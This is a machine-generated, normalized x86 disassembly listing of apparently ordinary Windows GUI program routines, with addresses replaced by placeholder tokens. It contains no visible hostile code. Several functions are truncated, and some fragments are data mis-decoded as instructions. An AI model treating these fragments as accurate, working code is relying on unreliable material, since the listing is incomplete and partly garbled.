mov [ eax + 0x40 ] dl
call sub_45a12c
sub_45a85c
jmp sub_403b24
sub_45a8a0
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_45a8b8
push ebx
mov ebx eax
mov eax ebx
call sub_423ef8
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45a90a
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_45a12c
sub_45a980
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45aac9
jmp sub_403b24
sub_45aad0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ad10
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45ad20
sub_45ad74
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_45ad84
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_45ad94
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_45ada4
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_45adb4
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_45ae2c
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_457174
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_457174
retn
sub_45ae48
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_457174
sub_45ae90
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_45a0e4
retn
mov eax edx
retn
sub_45af3c
mov [ eax + 0x58 ] edx
call sub_45ae64
retn
sub_45af72
jmp sub_403870
sub_45af77
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b2dd
jmp sub_403b24
sub_45b2e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403390
retn
sub_45b2fa
jmp sub_403b24
sub_45b3fb
jmp sub_403b24
sub_45b402
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b41f
mov eax [ ebp - 0x14 ]
call sub_403390
retn
sub_45b418
jmp sub_403b24
sub_45b43d
jmp sub_403b24
sub_45b4c7
jmp sub_403b24
sub_45b4ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b500
push ebx
mov ebx eax
mov eax ebx
call sub_41b7f0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_424ca8
sub_45b5c4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45b5d8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_45b5e0
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_45b9a5
jmp sub_403b24
sub_45b9ac
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45baab
retn
sub_45baac
jmp sub_403b24
j_sub_45baab
jmp sub_45baab
sub_45bab3
pop ebp
retn
sub_45c464
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x440045c5 ]
mov [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
retn 0x45c5
sub_45c62b
[ edi + edi * 8 - 0x2f002f ]
sub_45c632
stc
jmp esp
sub_45d8f4
mov eax [ rw-data ]
retn
sub_45d8fc
mov [ rw-data ] eax
retn
sub_45da44
jmp sub_403870
sub_45da7b
jmp sub_403b24
sub_45da82
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dd8a
jmp sub_403b24
sub_45dd91
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45de35
jmp sub_403b24
sub_45de3c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45decc
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_45e5f8
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45eca4
sub_45e614
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_45e5f8
sub_45e734
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45eca4
sub_45e74c
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_45eca4
sub_45e764
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_45eca4
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_45e790
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_45e79c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_45eca4
retn
sub_45ea7c
push ebx
mov ebx edx
mov edx ebx
call sub_44a5f8
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45eaec
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_45ec14
jmp sub_403b24
sub_45ec1b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ec24
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45e030
mov eax [ ebx + 0x20c ]
call sub_45e030
sub_45ec84
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45ec94
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45ed8f
jmp sub_403b24
sub_45ed9c
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_45edb4
sub_45efd0
retn
sub_45f03e
jmp sub_403b24
sub_45f07d
jmp sub_403b24
sub_45f0b0
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44baf0
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_45e2bc
retn
sub_45f0d4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44bb10
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_45e2bc
retn
sub_45f1c9
jmp sub_403b24
sub_45f1d0
mov eax [ ebp - 0x4 ]
call sub_44daa8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_45df24
mov eax [ ebp - 0x4 ]
call sub_45eca4
sub_45f304
jmp sub_403b24
sub_45f33c
jmp sub_403b24
sub_45f343
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f363
lea eax [ ebp - 0x114 ]
call sub_404120
retn
sub_45f35c
jmp sub_403b24
sub_45f363
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_45f66a
jmp sub_403b24
sub_45f671
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403744
sub_45f6c5
jmp sub_403870
sub_45f741
jmp sub_403870
sub_45f746
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fafe
jmp sub_403b24
sub_45fb05
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fbe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41fd34
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45fbf8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45fc30
mov edx eax
mov eax esi
call sub_421f24
pop esi
pop ebx
retn
sub_45fc14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460fd4
mov edx eax
mov eax esi
call sub_421f24
pop esi
pop ebx
retn
sub_45fc30
push ebx
mov ebx eax
mov eax ebx
call sub_460c74
mov edx r-xdata
call sub_427bcc
pop ebx
retn
sub_45fd34
push ebx
mov ebx eax
mov eax ebx
call sub_45fd44
xor al 0x1
pop ebx
retn
sub_45fd44
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45fda0
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45fdc0
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45fde0
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4600d9
jmp sub_403b24
sub_4600e0
pop ecx
pop ebp
retn
sub_4600e4
xor eax eax
retn
sub_4603bc
jmp sub_403b24
sub_4603c3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_4603d9
jmp sub_403b24
sub_4604c3
jmp sub_403b24
sub_4604ca
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4604e7
mov eax [ ebp - 0xc ]
call sub_403390
retn
sub_4604e0
jmp sub_403b24
sub_460507
jmp sub_403b24
sub_4607f2
jmp sub_403b24
sub_460985
jmp sub_403b24
sub_460c74
mov eax [ eax + 0x238 ]
retn
sub_460c7c
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_460c88
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_460fc6
jmp sub_403b24
sub_460fcd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460fd4
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_46101c
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44ad0c
sub_461038
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_461074
push ebx
mov ebx eax
mov eax ebx
call sub_44cca0
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_427608
sub_4610f8
push ebx
mov ebx eax
mov eax ebx
call sub_44ccc8
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_427c70
sub_461118
push ebx
mov ebx eax
mov eax ebx
call sub_460d38
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_460e00
pop ebx
retn
sub_461945
lea eax [ ebp - 0xb4 ]
call sub_404120
retn
sub_461951
jmp sub_403b24
j_sub_461945
jmp sub_461945
sub_461958
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461ab0
jmp sub_403b24
sub_461ab7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461d9c
jmp sub_403b24
sub_461dba
add [ eax ] al
retn
sub_462018
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_462038
mov eax [ eax + 0x240 ]
call sub_42da98
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_4663f4
sub_4620df
jmp sub_403b24
sub_4620e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462109
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_427c48
retn
sub_462102
jmp sub_403b24
sub_462109
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4622c8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462038
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_462530
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45a298
sub_46261b
jmp sub_403b24
sub_462622
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462628
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_461e10
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_462680
call sub_4633a8
retn
sub_462acd
jmp sub_403b24
sub_462ad4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462dd0
jmp sub_403870
sub_46316c
jmp sub_403870
sub_463265
jmp sub_403b24
sub_46326c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463289
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_463282
jmp sub_403b24
sub_463289
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_463290
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42da98
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45fcd8
sub_4632b0
call sub_403390
retn
sub_463308
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_46336e
jmp sub_403b24
sub_46351c
jmp sub_403870
sub_463548
xor edx edx
call sub_46003c
retn
sub_463550
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_46003c
mov eax ebx
call sub_4471e4
pop ebx
retn
sub_4635d6
jmp sub_403b24
sub_4635dd
pop ebx
pop ecx
pop ebp
retn
sub_4635e4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_44d7a4
push eax
call PostMessageA
pop ebx
retn
sub_4637e8
jmp sub_403b24
sub_463889
jmp sub_403b24
sub_463893
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4638b2
mov eax [ rw-data ]
call sub_465acc
retn
sub_4638ab
jmp sub_403b24
sub_4638b2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4638cf
lea eax [ ebp - 0x20 ]
call sub_404120
retn
sub_4638c8
jmp sub_403b24
sub_4638cf
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4639b0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_446390
retn
mov edx eax
mov eax [ rw-data ]
call sub_465120
retn
sub_463d34
mov edx eax
mov eax [ rw-data ]
call sub_466be8
mov al 0x1
retn
sub_463e1c
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_463d44
sub_463e30
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_463d44
sub_463e44
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_463d44
sub_463e58
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_463d44
sub_463e6c
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_463fd7
jmp sub_403b24
sub_463fde
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463fe4
push ebx
mov ebx eax
mov eax ebx
call sub_44c084
mov eax ebx
call sub_44c208
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4635e4
sub_46425a
jmp sub_403b24
sub_464261
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464268
push ebx
mov ebx edx
mov edx ebx
call sub_44c4ec
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_446498
pop ebx
retn
sub_4642bc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_464324
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4642d4
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_464324
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4642f0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_464324
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_464308
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_464324
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4645a4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645b0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645bc
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645c8
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645d4
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645e0
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4645ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_41b654
pop esi
pop ebx
retn
sub_464600
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46461c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41b654
pop esi
pop ebx
retn
sub_464630
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_464638
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41b654
pop esi
pop ebx
retn
sub_46464c
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_464728
mov eax [ eax + 0x54 ]
call sub_41b4f8
retn
sub_464734
mov eax [ eax + 0x54 ]
call sub_41b7f0
retn
sub_464987
jmp sub_403b24
sub_4649cb
jmp sub_403b24
sub_4649d2
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_464a20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_464820
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404174
pop esi
pop ebx
retn
sub_464a8c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_41b654
pop esi
pop ebx
retn
sub_464aa0
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_464ca5
jmp sub_403b24
sub_464cac
pop ebx
mov esp ebp
pop ebp
retn
sub_464cb4
inc [ eax + 0x8c ]
retn
sub_464cbc
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_464cdc
sub_464cdc
xor edx edx
call sub_465120
retn
sub_465112
jmp sub_403b24
sub_465199
jmp sub_403b24
sub_4651a8
add eax 0x30
call sub_40d7a0
retn
sub_4651ec
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_46523d
jmp sub_403870
sub_465242
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_465911
jmp sub_403b24
sub_465918
pop ebx
mov esp ebp
pop ebp
retn
sub_465aa0
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_465acc
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_465af8
xor edx edx
call sub_4659f0
retn
sub_465b00
mov dl 0x1
call sub_4659f0
retn
sub_465b74
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_465b8c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_465c59
jmp sub_403b24
sub_465c60
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4663aa
jmp sub_403870
sub_4666ca
jmp sub_403b24
sub_4666d1
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46693c
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_4668a4
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_466a50
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_466aa6
jmp sub_403870
j_sub_403870#9
jmp sub_403870
sub_466bc6
jmp sub_403b24
sub_466bcd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466bd4
call sub_40d2f0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_466dcd
jmp sub_403b24
sub_466dd4
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_466e9b
jmp sub_403b24
sub_466ea2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467078
jmp sub_403b24
sub_46707f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4670e0
jmp sub_403b24
sub_4670e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4670f0
call sub_466eb8
retn
j_sub_403870#8
jmp sub_403870
sub_467334
jmp sub_403b24
sub_46733b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467469
jmp sub_403b24
sub_4675c8
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_4678c7
jmp sub_403b24
sub_4678f6
jmp sub_403b24
sub_467a02
jmp sub_403b24
sub_467a09
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467d9a
jmp sub_403b24
sub_467da1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467de4
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_467f14
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_467f5f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_467f70
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_467f80
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_467ff3
jmp sub_403b24
sub_467ffa
pop ebp
retn
sub_467ffc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_467f90
call sub_403ef4
call sub_467f14
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_45dbd0
call sub_41afbc
sub_46822d
jmp sub_403b24
sub_468238
sub [ rw-data ] 0x1
retn
sub_468405
jmp sub_403b24
sub_46840c
pop ebp
retn
sub_468410
sub [ rw-data ] 0x1
retn
sub_468530
jmp sub_403b24
sub_468568
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_4693c8
sub_468584
mov eax 0x0
call sub_469314
jmp eax
sub_468590
retn
sub_468594
mov eax 0x1
call sub_469314
jmp eax
sub_4685a0
retn
sub_4685a4
mov eax 0x2
call sub_469314
jmp eax
sub_4685b0
retn
sub_4685b4
mov eax 0x3
call sub_469314
jmp eax
sub_4685c0
retn
sub_4685c4
mov eax 0x4
call sub_469314
jmp eax
sub_4685d0
retn
sub_4685d4
mov eax 0x5
call sub_469314
jmp eax
sub_4685e0
retn
sub_4685e4
mov eax 0x6
call sub_469314
jmp eax
sub_4685f0
retn
sub_4685f4
mov eax 0x7
call sub_469314
jmp eax
sub_468600
retn
sub_468604
mov eax 0x8
call sub_469314
jmp eax
sub_468610
retn
sub_468614
mov eax 0x9
call sub_469314
jmp eax
sub_468620
retn
sub_468624
mov eax 0xa
call sub_469314
jmp eax
sub_468630
retn
sub_468634
mov eax 0xb
call sub_469314
jmp eax
sub_468640
retn
sub_468644
mov eax 0xc
call sub_469314
jmp eax
sub_468650
retn
sub_468654
mov eax 0xd
call sub_469314
jmp eax
sub_468660
retn
sub_468664
mov eax 0xe
call sub_469314
jmp eax
sub_468670
retn
sub_468674
mov eax 0xf
call sub_469314
jmp eax
sub_468680
retn
sub_468684
mov eax 0x10
call sub_469314
jmp eax
sub_468690
retn
sub_468694
mov eax 0x11
call sub_469314
jmp eax
sub_4686a0
retn
sub_4686a4
mov eax 0x12
call sub_469314
jmp eax
sub_4686b0
retn
sub_4686b4
mov eax 0x13
call sub_469314
jmp eax
sub_4686c0
retn
sub_4686c4
mov eax 0x14
call sub_469314
jmp eax
sub_4686d0
retn
sub_4686d4
mov eax 0x15
call sub_469314
jmp eax
sub_4686e0
retn
sub_4686e4
mov eax 0x16
call sub_469314
jmp eax
sub_4686f0
retn
sub_4686f4
mov eax 0x17
call sub_469314
jmp eax
sub_468700
retn
sub_468704
mov eax 0x18
call sub_469314
jmp eax
sub_468710
retn
sub_468714
mov eax 0x19
call sub_469314
jmp eax
sub_468720
retn
sub_468724
mov eax 0x1a
call sub_469314
jmp eax
sub_468730
retn
sub_468734
mov eax 0x1b
call sub_469314
jmp eax
sub_468740
retn
sub_468744
mov eax 0x1c
call sub_469314
jmp eax
sub_468750
retn
sub_468754
mov eax 0x1d
call sub_469314
jmp eax
sub_468760
retn
sub_468764
mov eax 0x1e
call sub_469314
jmp eax
sub_468770
retn
sub_468774
mov eax 0x1f
call sub_469314
jmp eax
sub_468780
retn
sub_468784
mov eax 0x20
call sub_469314
jmp eax
sub_468790
retn
sub_468794
mov eax 0x21
call sub_469314
jmp eax
sub_4687a0
retn
sub_4687a4
mov eax 0x22
call sub_469314
jmp eax
sub_4687b0
retn
sub_4687b4
mov eax 0x23
call sub_469314
jmp eax
sub_4687c0
retn
sub_4687c4
mov eax 0x24
call sub_469314
jmp eax
sub_4687d0
retn
sub_4687d4
mov eax 0x25
call sub_469314
jmp eax
sub_4687e0
retn
sub_4687e4
mov eax 0x26
call sub_469314
jmp eax
sub_4687f0
retn
sub_4687f4
mov eax 0x27
call sub_469314
jmp eax
sub_468800
retn
sub_468804
mov eax 0x28
call sub_469314
jmp eax
sub_468810
retn
sub_468814
mov eax 0x29
call sub_469314
